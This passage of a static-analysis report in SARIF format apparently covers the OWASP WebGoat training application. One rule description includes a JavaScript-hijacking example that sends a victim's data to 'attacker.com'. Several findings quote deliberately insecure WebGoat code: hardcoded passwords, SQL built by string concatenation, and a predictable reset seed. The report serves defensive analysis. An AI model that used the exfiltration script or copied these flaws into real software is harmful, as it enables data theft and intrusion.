\"purchases\":60000.00, \"email\":\"brian@example.com\" },\n {\"fname\":\"Katrina\", \"lname\":\"O'Neil\", \"phone\":\"6502135600\",\n  \"purchases\":120000.00, \"email\":\"katrina@example.com\" },\n {\"fname\":\"Jacob\", \"lname\":\"West\", \"phone\":\"6502135600\",\n  \"purchases\":45000.00, \"email\":\"jacob@example.com\" }]\n`\r\n\r\nIn this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site.\r\n\r\n`\n&lt;script&gt;\n// override the constructor used to create all objects so\n// that whenever the \"email\" field is set, the method\n// captureObject() will run. Since \"email\" is the final field,\n// this will allow us to steal the whole object.\nfunction Object() {\n this.email setter = captureObject;\n}\r\n\r\n// Send the captured object back to the attacker's web site\nfunction captureObject(x) {\n  var objString = \"\";\n  for (fld in this) {\n    objString += fld + \": \" + this[fld] + \", \";\n  }\n  objString += \"email: \" + x;\n  var req = new XMLHttpRequest();\n  req.open(\"GET\", \"http://attacker.com?obj=\" +\n           escape(objString),true);\n  req.send(null);\n}\n&lt;/script&gt;\r\n\r\n&lt;!-- Use a script tag to bring in victim's data --&gt;\n&lt;script src=\"http://www.example.com/object.json\"&gt;&lt;/script&gt;\n`\r\n\r\nThe malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.\r\n\r\nWhen the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker may compensate by asking the user to log in and then displaying the legitimate login page for the application.\r\n\r\nThis is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious."
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "6DEAABAF-72E9-4AD6-8903-0EB8E858CB89",
              "guid": "6DEAABAF-72E9-4AD6-8903-0EB8E858CB89",
              "name": "Code Quality/Unreleased Resource/Sockets",
              "shortDescription": {
                "text": "The function {EnclosingFunction.name} in {PrimaryLocation.file} sometimes fails to release a socket allocated by {FirstTransitionFunction} on line {FirstTraceLocation.line}.\r\nThe program can potentially fail to release a socket."
              },
              "fullDescription": {
                "text": "The program can potentially fail to release a socket.\r\n\r\nIn this case, there are program paths on which the socket allocated in {FirstTraceLocation.file} at line {FirstTraceLocation.line} is not released.\r\n\r\nResource leaks have at least two common causes:\r\n\r\n- Error conditions and other exceptional circumstances.\r\n\r\n- Confusion over which part of the program is responsible for releasing the resource.\r\n\r\nMost unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.\r\n\r\n**Example 1:** The following method never closes the socket it opens. In a busy environment, this can result in the JVM using up all of its sockets.\r\n\r\n`\nprivate void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException\n{\n  Socket sock = new Socket(host, port);\n  BufferedReader reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));\r\n\r\n  while ((String socketData = reader.readLine()) != null) {\n    System.out.println(socketData);\n  }\n}\n`\r\n\r\n**Example 2:** Under normal conditions, the following fix properly closes the socket and any associated streams. But if an exception occurs while reading the input or writing the data to screen, the socket object will not be closed. If this happens often enough, the system will run out of sockets and not be able to handle any further connections.\r\n\r\n`\nprivate void echoSocket(String host, int port) throws UnknownHostException, SocketException, IOException\n{\n  Socket sock = new Socket(host, port);\n  BufferedReader reader = new BufferedReader(new InputStreamReader(sock.getInputStream()));\r\n\r\n  while ((String socketData = reader.readLine()) != null) {\n    System.out.println(socketData);\n  }\n  sock.close();\n}\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "404",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "2.5",
                "Probability": "1.0"
              }
            },
            {
              "id": "2A983818-6144-4E5A-BE5C-E955BF9A3FBA",
              "guid": "2A983818-6144-4E5A-BE5C-E955BF9A3FBA"
            },
            {
              "id": "3DB05E5F-9092-4A34-A846-2A07FC7595BB",
              "guid": "3DB05E5F-9092-4A34-A846-2A07FC7595BB"
            },
            {
              "id": "467DCCCF-D988-4CE4-8941-81A7D9E08E57",
              "guid": "467DCCCF-D988-4CE4-8941-81A7D9E08E57"
            },
            {
              "id": "519BC304-A0D6-4D6F-AB78-CB5EAB4298FE0",
              "guid": "519BC304-A0D6-4D6F-AB78-CB5EAB4298FE"
            },
            {
              "id": "A6172DC7-C2D9-487A-A99F-7189A0170661",
              "guid": "A6172DC7-C2D9-487A-A99F-7189A0170661"
            },
            {
              "id": "D312DFA3-EF02-46A5-A25B-29D218E96EF1",
              "guid": "D312DFA3-EF02-46A5-A25B-29D218E96EF1"
            },
            {
              "id": "E080F8D1-F512-49DA-B076-CBA2A217C538",
              "guid": "E080F8D1-F512-49DA-B076-CBA2A217C538"
            },
            {
              "id": "F0B4AD7A-22C9-4C6A-B665-FCE9FD033A69",
              "guid": "F0B4AD7A-22C9-4C6A-B665-FCE9FD033A69"
            }
          ],
          "supportedTaxonomies": [
            {
              "name": "CWE",
              "index": 0,
              "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
            }
          ]
        }
      },
      "originalUriBaseIds": {
        "%SRCROOT%": {
          "uri": "file:///E:/src/WebGoat/"
        }
      },
      "results": [
        {
          "ruleId": "DD48C0E5-3651-4DF1-9BE8-EB989C64E33A",
          "ruleIndex": 15,
          "level": "error",
          "message": {
            "text": "Hardcoded passwords may compromise system security in a way that cannot be easily remedied."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/SolutionConstants.java",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 36,
                  "snippet": {
                    "text": "    String ADMIN_PASSWORD_LINK = \"375afe1104f4a487a73823c50a9292a2\";"
                  }
                },
                "contextRegion": {
                  "startLine": 33,
                  "endLine": 37,
                  "snippet": {
                    "text": "    //TODO should be random generated when starting the server\n    String PASSWORD = \"!!webgoat_admin_1234!!\";\n    String PASSWORD_TOM = \"thisisasecretfortomonly\";\n    String ADMIN_PASSWORD_LINK = \"375afe1104f4a487a73823c50a9292a2\";\n}\n"
                  }
                }
              }
            }
          ],
          "relatedLocations": [
            {
              "id": 1,
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/SolutionConstants.java",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 5
                }
              },
              "message": {
                "text": "[No message provided.]"
              }
            }
          ],
          "properties": {
            "InstanceSeverity": "3.0",
            "Confidence": "5.0"
          }
        },
        {
          "ruleId": "B7DFF4A8-9817-4418-A35B-E70D10DC825E",
          "ruleIndex": 29,
          "level": "error",
          "message": {
            "text": "The function [login()](1) in [Assignment5.java](1) sometimes fails to release a database resource allocated by [getConnection()](1) on line [58](1).\r\nThe program can potentially fail to release a database resource."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge5/Assignment5.java",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 58,
                  "snippet": {
                    "text": "        try (var connection = dataSource.getConnection()) {"
                  }
                },
                "contextRegion": {
                  "startLine": 55,
                  "endLine": 61,
                  "snippet": {
                    "text": "        if (!\"Larry\".equals(username_login)) {\n            return failed(this).feedback(\"user.not.larry\").feedbackArgs(username_login).build();\n        }\n        try (var connection = dataSource.getConnection()) {\n            PreparedStatement statement = connection.prepareStatement(\"select password from challenge_users where userid = '\" + username_login + \"' and password = '\" + password_login + \"'\");\n            ResultSet resultSet = statement.executeQuery();\n\n"
                  }
                }
              }
            }
          ],
          "relatedLocations": [
            {
              "id": 1,
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge5/Assignment5.java",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 58,
                  "startColumn": 42
                }
              },
              "message": {
                "text": "[No message provided.]"
              }
            }
          ],
          "properties": {
            "InstanceSeverity": "3.0",
            "Confidence": "5.0"
          }
        },
        {
          "ruleId": "A79E289A-14D7-4dfd-8E34-F249133A69FE",
          "ruleIndex": 76,
          "level": "error",
          "message": {
            "text": "Hardcoded passwords may compromise system security in a way that cannot be easily remedied."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "webgoat-lessons/jwt/src/main/resources/js/jwt-refresh.js",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 10,
                  "snippet": {
                    "text": "        data: JSON.stringify({user: user, password: \"bm5nhSkxCXZkKRy4\"})"
                  }
                },
                "contextRegion": {
                  "startLine": 7,
                  "endLine": 13,
                  "snippet": {
                    "text": "        type: 'POST',\n        url: 'JWT/refresh/login',\n        contentType: \"application/json\",\n        data: JSON.stringify({user: user, password: \"bm5nhSkxCXZkKRy4\"})\n    }).success(\n        function (response) {\n            localStorage.setItem('access_token', response['access_token']);\n"
                  }
                }
              }
            }
          ],
          "relatedLocations": [
            {
              "id": 1,
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "webgoat-lessons/jwt/src/main/resources/js/jwt-refresh.js",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 43
                }
              },
              "message": {
                "text": "[No message provided.]"
              }
            }
          ],
          "properties": {
            "InstanceSeverity": "4.0",
            "Confidence": "5.0"
          }
        },
        {
          "ruleId": "3CB1D23E-CE0D-47E5-B387-F1026CDA0D64",
          "ruleIndex": 36,
          "level": "error",
          "message": {
            "text": "The function [createPasswordReset()](1) in [PasswordResetLink.java](1) is passed a tainted value for the seed. Functions that generate random or pseudorandom values, which are passed a seed, should not be called with a tainted integer argument.\r\nFunctions that generate random or pseudorandom values, which are passed a seed, should not be called with a tainted integer argument."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/PasswordResetLink.java",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 17,
                  "snippet": {
                    "text": "            random.setSeed(key.length());"
                  }
                },
                "contextRegion": {
                  "startLine": 14,
                  "endLine": 20,
                  "snippet": {
                    "text": "        Random random = new Random();\n        if (username.equalsIgnoreCase(\"admin\")) {\n            //Admin has a fix reset link\n            random.setSeed(key.length());\n        }\n        return scramble(random, scramble(random, scramble(random, MD5.getHashString(username))));\n    }\n"
                  }
                }
              }
            }
          ],
          "relatedLocations": [
            {
              "id": 1,
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/PasswordResetLink.java",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 32
                }
              },
              "message": {
                "text": "[No message provided.]"
              }
            }
          ],
          "properties": {
            "InstanceSeverity": "3.0",
            "Confidence": "5.0"
          }
        },
        {
          "ruleId": "49D75ADD-4BBD-49B9-AAF2-92B9BAB332FE",
          "ruleIndex": 74,
          "level": "error",
          "message": {
            "text": "The random number generator implemented by [nextInt()](1) cannot withstand a cryptographic attack.\r\nStandard pseudorandom number generators cannot withstand cryptographic attacks."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "webgoat-lessons/csrf/src/main/java/org/owasp/webgoat/csrf/CSRFGetFlag.java",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 69,
                  "snippet": {
                    "text": "                userSessionData.setValue(\"csrf-get-success\", random.nextInt(65536));"
                  }
                },
                "contextRegion": {
                  "startLine": 66,
                  "endLine": 72,
                  "snippet": {
                    "text": "                response.put(\"flag\", userSessionData.getValue(\"csrf-get-success\"));\n            } else {\n                Random random = new Random();\n                userSessionData.setValue(\"csrf-get-success\", random.nextInt(65536));\n                response.put(\"success\", true);\n                response.put(\"message\", pluginMessages.getMessage(\"csrf-get-other-referer.success\"));\n                response.put(\"flag\", userSessionData.getValue(\"csrf-get-success\"));\n"
                  }
                }
              }
            }
          ],
          "relatedLocations": [
            {
              "id": 1,
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "webgoat-lessons/csrf/src/main/java/org/owasp/webgoat/csrf/CSRFGetFlag.java",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 69
                }
              },
              "message": {
                "text": "[No message provided.]"
              }
            }
          ],
          "properties": {
            "InstanceSeverity": "2.0",
            "Confidence": "5.0"
          }
        }],
      "automationDetails": {
        "id": "WebGoat/"
      },
      "columnKind": "utf16CodeUnits",
      "threadFlowLocations": [
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/webwolf-introduction/src/main/java/org/owasp/webgoat/webwolf_introduction/LandingAssignment.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 61,
                "snippet": {
                  "text": "        URI uri = new URI(request.getRequestURL().toString());"
                }
              },
              "contextRegion": {
                "startLine": 58,
                "endLine": 64,
                "snippet": {
                  "text": "\n    @GetMapping(\"/WebWolf/landing/password-reset\")\n    public ModelAndView openPasswordReset(HttpServletRequest request) throws URISyntaxException {\n        URI uri = new URI(request.getRequestURL().toString());\n        ModelAndView modelAndView = new ModelAndView();\n        modelAndView.addObject(\"webwolfUrl\", landingPageUrl);\n        modelAndView.addObject(\"uniqueCode\", StringUtils.reverse(getWebSession().getUserName()));\n"
                }
              }
            },
            "message": {
              "text": "getRequestURL(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/webwolf-introduction/src/main/java/org/owasp/webgoat/webwolf_introduction/LandingAssignment.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 61,
                "snippet": {
                  "text": "        URI uri = new URI(request.getRequestURL().toString());"
                }
              },
              "contextRegion": {
                "startLine": 58,
                "endLine": 64,
                "snippet": {
                  "text": "\n    @GetMapping(\"/WebWolf/landing/password-reset\")\n    public ModelAndView openPasswordReset(HttpServletRequest request) throws URISyntaxException {\n        URI uri = new URI(request.getRequestURL().toString());\n        ModelAndView modelAndView = new ModelAndView();\n        modelAndView.addObject(\"webwolfUrl\", landingPageUrl);\n        modelAndView.addObject(\"uniqueCode\", StringUtils.reverse(getWebSession().getUserName()));\n"
                }
              }
            },
            "message": {
              "text": "toString(this : return)"
            }
          },
          "kinds": [
            "call",
            "function",
            "return"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/PasswordResetLink.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 33,
                "snippet": {
                  "text": "    public static void main(String[] args) {"
                }
              },
              "contextRegion": {
                "startLine": 30,
                "endLine": 36,
                "snippet": {
                  "text": "        return new String(a);\n    }\n\n    public static void main(String[] args) {\n        if (args == null || args.length != 2) {\n            System.out.println(\"Need a username and key\");\n            System.exit(1);\n"
                }
              }
            },
            "message": {
              "text": "main(0)"
            }
          },
          "kinds": [
            "call",
            "function"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/PasswordResetLink.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 39,
                "snippet": {
                  "text": "        String key = args[1];"
                }
              },
              "contextRegion": {
                "startLine": 36,
                "endLine": 42,
                "snippet": {
                  "text": "            System.exit(1);\n        }\n        String username = args[0];\n        String key = args[1];\n        System.out.println(\"Generation password reset link for \" + username);\n        System.out.println(\"Created password reset link: \" + new PasswordResetLink().createPasswordReset(username, key));\n    }\n"
                }
              }
            },
            "message": {
              "text": "Assignment to key"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/PasswordResetLink.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 39,
                "snippet": {
                  "text": "        String key = args[1];"
                }
              },
              "contextRegion": {
                "startLine": 36,
                "endLine": 42,
                "snippet": {
                  "text": "            System.exit(1);\n        }\n        String username = args[0];\n        String key = args[1];\n        System.out.println(\"Generation password reset link for \" + username);\n        System.out.println(\"Created password reset link: \" + new PasswordResetLink().createPasswordReset(username, key));\n    }\n"
                }
              }
            },
            "message": {
              "text": "Taint change on key"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/PasswordResetLink.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 41,
                "snippet": {
                  "text": "        System.out.println(\"Created password reset link: \" + new PasswordResetLink().createPasswordReset(username, key));"
                }
              },
              "contextRegion": {
                "startLine": 38,
                "endLine": 43,
                "snippet": {
                  "text": "        String username = args[0];\n        String key = args[1];\n        System.out.println(\"Generation password reset link for \" + username);\n        System.out.println(\"Created password reset link: \" + new PasswordResetLink().createPasswordReset(username, key));\n    }\n}\n"
                }
              }
            },
            "message": {
              "text": "createPasswordReset(1)"
            }
          },
          "kinds": [
            "call",
            "function"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/PasswordResetLink.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 17,
                "snippet": {
                  "text": "            random.setSeed(key.length());"
                }
              },
              "contextRegion": {
                "startLine": 14,
                "endLine": 20,
                "snippet": {
                  "text": "        Random random = new Random();\n        if (username.equalsIgnoreCase(\"admin\")) {\n            //Admin has a fix reset link\n            random.setSeed(key.length());\n        }\n        return scramble(random, scramble(random, scramble(random, MD5.getHashString(username))));\n    }\n"
                }
              }
            },
            "message": {
              "text": "length(this : return)"
            }
          },
          "kinds": [
            "call",
            "function",
            "return"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/jquery_form/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 115,
                "snippet": {
                  "text": "    url = url || window.location.href || '';"
                }
              },
              "contextRegion": {
                "startLine": 112,
                "endLine": 118,
                "snippet": {
                  "text": "    action = options.url  || this.attr2('action');\n\n    url = (typeof action === 'string') ? $.trim(action) : '';\n    url = url || window.location.href || '';\n    if (url) {\n        // clean url (don't include hash vaue)\n        url = (url.match(/^([^#]+)/)||[])[1];\n"
                }
              }
            },
            "message": {
              "text": "Read window.location.href"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/jquery_form/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 115,
                "snippet": {
                  "text": "    url = url || window.location.href || '';"
                }
              },
              "contextRegion": {
                "startLine": 112,
                "endLine": 118,
                "snippet": {
                  "text": "    action = options.url  || this.attr2('action');\n\n    url = (typeof action === 'string') ? $.trim(action) : '';\n    url = url || window.location.href || '';\n    if (url) {\n        // clean url (don't include hash vaue)\n        url = (url.match(/^([^#]+)/)||[])[1];\n"
                }
              }
            },
            "message": {
              "text": "Assignment to url"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/jquery_form/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 200,
                "snippet": {
                  "text": "    options.success = function(data, status, xhr) { // jQuery 1.4+ passes xhr as 3rd arg"
                }
              },
              "contextRegion": {
                "startLine": 197,
                "endLine": 203,
                "snippet": {
                  "text": "        callbacks.push(options.success);\n    }\n\n    options.success = function(data, status, xhr) { // jQuery 1.4+ passes xhr as 3rd arg\n        var context = options.context || this ;    // jQuery 1.4+ supports scope context\n        for (var i=0, max=callbacks.length; i < max; i++) {\n            callbacks[i].apply(context, [data, status, xhr || $form, $form]);\n"
                }
              }
            },
            "message": {
              "text": "Assignment to options.success"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/libs/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 115,
                "snippet": {
                  "text": "    url = url || window.location.href || '';"
                }
              },
              "contextRegion": {
                "startLine": 112,
                "endLine": 118,
                "snippet": {
                  "text": "    action = options.url  || this.attr2('action');\n\n    url = (typeof action === 'string') ? $.trim(action) : '';\n    url = url || window.location.href || '';\n    if (url) {\n        // clean url (don't include hash vaue)\n        url = (url.match(/^([^#]+)/)||[])[1];\n"
                }
              }
            },
            "message": {
              "text": "Read window.location.href"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/jquery_form/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 250,
                "snippet": {
                  "text": "            jqxhr = fileUploadIframe(a);"
                }
              },
              "contextRegion": {
                "startLine": 247,
                "endLine": 253,
                "snippet": {
                  "text": "            });\n        }\n        else {\n            jqxhr = fileUploadIframe(a);\n        }\n    }\n    else if ((hasFileInputs || multipart) && fileAPI) {\n"
                }
              }
            },
            "message": {
              "text": "fileUploadIframe({options})"
            }
          },
          "kinds": [
            "call",
            "function"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/jquery_form/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 372,
                "snippet": {
                  "text": "        s = $.extend(true, {}, $.ajaxSettings, options);"
                }
              },
              "contextRegion": {
                "startLine": 369,
                "endLine": 375,
                "snippet": {
                  "text": "            }\n        }\n\n        s = $.extend(true, {}, $.ajaxSettings, options);\n        s.context = s.context || s;\n        id = 'jqFormIO' + (new Date().getTime());\n        if (s.iframeTarget) {\n"
                }
              }
            },
            "message": {
              "text": "extend(3 : return)"
            }
          },
          "kinds": [
            "call",
            "function",
            "return"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/libs/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 115,
                "snippet": {
                  "text": "    url = url || window.location.href || '';"
                }
              },
              "contextRegion": {
                "startLine": 112,
                "endLine": 118,
                "snippet": {
                  "text": "    action = options.url  || this.attr2('action');\n\n    url = (typeof action === 'string') ? $.trim(action) : '';\n    url = url || window.location.href || '';\n    if (url) {\n        // clean url (don't include hash vaue)\n        url = (url.match(/^([^#]+)/)||[])[1];\n"
                }
              }
            },
            "message": {
              "text": "Assignment to url"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/jquery_form/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 372,
                "snippet": {
                  "text": "        s = $.extend(true, {}, $.ajaxSettings, options);"
                }
              },
              "contextRegion": {
                "startLine": 369,
                "endLine": 375,
                "snippet": {
                  "text": "            }\n        }\n\n        s = $.extend(true, {}, $.ajaxSettings, options);\n        s.context = s.context || s;\n        id = 'jqFormIO' + (new Date().getTime());\n        if (s.iframeTarget) {\n"
                }
              }
            },
            "message": {
              "text": "Assignment to s"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/libs/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 200,
                "snippet": {
                  "text": "    options.success = function(data, status, xhr) { // jQuery 1.4+ passes xhr as 3rd arg"
                }
              },
              "contextRegion": {
                "startLine": 197,
                "endLine": 203,
                "snippet": {
                  "text": "        callbacks.push(options.success);\n    }\n\n    options.success = function(data, status, xhr) { // jQuery 1.4+ passes xhr as 3rd arg\n        var context = options.context || this ;    // jQuery 1.4+ supports scope context\n        for (var i=0, max=callbacks.length; i < max; i++) {\n            callbacks[i].apply(context, [data, status, xhr || $form, $form]);\n"
                }
              }
            },
            "message": {
              "text": "Assignment to options.success"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/libs/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 250,
                "snippet": {
                  "text": "            jqxhr = fileUploadIframe(a);"
                }
              },
              "contextRegion": {
                "startLine": 247,
                "endLine": 253,
                "snippet": {
                  "text": "            });\n        }\n        else {\n            jqxhr = fileUploadIframe(a);\n        }\n    }\n    else if ((hasFileInputs || multipart) && fileAPI) {\n"
                }
              }
            },
            "message": {
              "text": "fileUploadIframe({options})"
            }
          },
          "kinds": [
            "call",
            "function"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/libs/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 372,
                "snippet": {
                  "text": "        s = $.extend(true, {}, $.ajaxSettings, options);"
                }
              },
              "contextRegion": {
                "startLine": 369,
                "endLine": 375,
                "snippet": {
                  "text": "            }\n        }\n\n        s = $.extend(true, {}, $.ajaxSettings, options);\n        s.context = s.context || s;\n        id = 'jqFormIO' + (new Date().getTime());\n        if (s.iframeTarget) {\n"
                }
              }
            },
            "message": {
              "text": "extend(3 : return)"
            }
          },
          "kinds": [
            "call",
            "function",
            "return"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/libs/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 372,
                "snippet": {
                  "text": "        s = $.extend(true, {}, $.ajaxSettings, options);"
                }
              },
              "contextRegion": {
                "startLine": 369,
                "endLine": 375,
                "snippet": {
                  "text": "            }\n        }\n\n        s = $.extend(true, {}, $.ajaxSettings, options);\n        s.context = s.context || s;\n        id = 'jqFormIO' + (new Date().getTime());\n        if (s.iframeTarget) {\n"
                }
              }
            },
            "message": {
              "text": "Assignment to s"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/jquery_form/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 209,
                "snippet": {
                  "text": "        options.error = function(xhr, status, error) {"
                }
              },
              "contextRegion": {
                "startLine": 206,
                "endLine": 212,
                "snippet": {
                  "text": "\n    if (options.error) {\n        var oldError = options.error;\n        options.error = function(xhr, status, error) {\n            var context = options.context || this;\n            oldError.apply(context, [xhr, status, error, $form]);\n        };\n"
                }
              }
            },
            "message": {
              "text": "Assignment to options.error"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/libs/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 209,
                "snippet": {
                  "text": "        options.error = function(xhr, status, error) {"
                }
              },
              "contextRegion": {
                "startLine": 206,
                "endLine": 212,
                "snippet": {
                  "text": "\n    if (options.error) {\n        var oldError = options.error;\n        options.error = function(xhr, status, error) {\n            var context = options.context || this;\n            oldError.apply(context, [xhr, status, error, $form]);\n        };\n"
                }
              }
            },
            "message": {
              "text": "Assignment to options.error"
